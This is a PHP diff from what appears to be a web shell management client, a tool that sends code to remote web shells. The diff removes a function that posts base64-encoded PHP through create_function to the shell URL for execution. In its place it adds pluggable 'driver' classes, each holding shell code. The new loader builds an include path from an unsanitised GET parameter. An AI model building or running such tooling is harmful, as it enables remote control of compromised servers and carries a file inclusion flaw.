@@ -7,29 +7,30 @@ class App {
     protected $controllerData;
     protected $controller;
     protected $shell;
+    protected $driver;
 
     public function __construct($config = null) {
         $this->config = $config;
         $this->loadControllers();
+        $this->loadDriver();
     }
 
     public function run() {
-        if (!isset($_GET['shell'])) {
-            echo 'web shell 地址不存在, 链接中需有 shell=[shell脚本地址]';
-            exit();
+        if (!isset($_GET['shell']) || !$_GET['shell']) {
+            return $this;
         }
         $default = $this->config['defaultController'] ? $this->config['defaultController'] : 'index';
         $c = isset($_GET['c']) ? $_GET['c'] : $default;
         $this->controller = $this->controllers[$c];
         if (isset($this->controllers[$c])) {
-            $this->controllerData = $this->controller->run();
+            $this->controllerData = $this->controller->setDriver($this->driver)->run();
         }
         return $this;
     }
 
     public function show() {
-        if (isset($_GET['json'])) {
-            require(__DIR__ . '/html/json.php');
+        if (isset($_GET['ajax'])) {
+            require(__DIR__ . '/html/ajax.php');
             return;
         }
         require(__DIR__ . '/html/index.php');
@@ -62,6 +63,30 @@ class App {
         }
     }
 
+    protected function loadDriver() {
+        $driver = isset($this->config['driver']) ? $this->config['driver'] . 'Driver' : 'defaultDriver';
+        if (isset($_GET['driver']) && $_GET['driver']) {
+            $driver = $_GET['driver'] . 'Driver';
+        }
+        require_once(__DIR__ . '/driver/' . $driver . '.php');
+        $this->driver = new $driver();
+    }
+
+    static public function loadDrivers() {
+        $files = scandir(__DIR__ . '/driver/');
+        $drivers = array();
+        foreach ($files as $file) {
+            if (!preg_match('/^(\w+Driver)\.php$/', $file, $match)) {
+                continue;
+            }
+            require_once(__DIR__ . '/driver/' . $file);
+            $name = $match[1];
+            $class = new $name();
+            $drivers[trim($name, 'Dirver')] = $class->shellCode;
+        }
+        return $drivers;
+    }
+
 }
 
 class Controller {
@@ -70,10 +95,31 @@ class Controller {
     public $pages = array();
     protected $var;
     protected $path;
+    protected $driver;
 
     public function __construct($config = null) {
         $this->config = $config;
         $this->path = $this->path();
+    }
+
+    public function setDriver(ShellDriver $driver) {
+        $this->driver = $driver;
+        return $this;
+    }
+
+    static function url($c, $a = null, $p = array()) {
+        $params['c'] = $c;
+        if ($a) {
+            $params['a'] = $a;
+        }
+        if (isset($_GET['shell']) && $_GET['shell']) {
+            $params['shell'] = $_GET['shell'];
+        }
+        if (isset($_GET['driver']) && $_GET['driver']) {
+            $params['driver'] = $_GET['driver'];
+        }
+        $params = array_merge($params, $p);
+        return 'index.php?' . http_build_query($params);
     }
 
     public function run() {
@@ -120,17 +166,16 @@ class Controller {
     }
 
     public function runShell($script, $ext = array()) {
-        $url = $_GET['shell'];
-        $data = array('f' => 'create_function', 'p' => $script);
-        $data = array_map('base64_encode', $data);
-        $data = array_merge($ext, $data);
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
+        $this->driver->url = $_GET['shell'];
+        return $this->driver->runShell($script, $ext);
     }
 
+}
+
+abstract class ShellDriver {
+
+    public $url;
+    public $shellCode;
+
+    abstract public function runShell($script, $ext = array());
 }
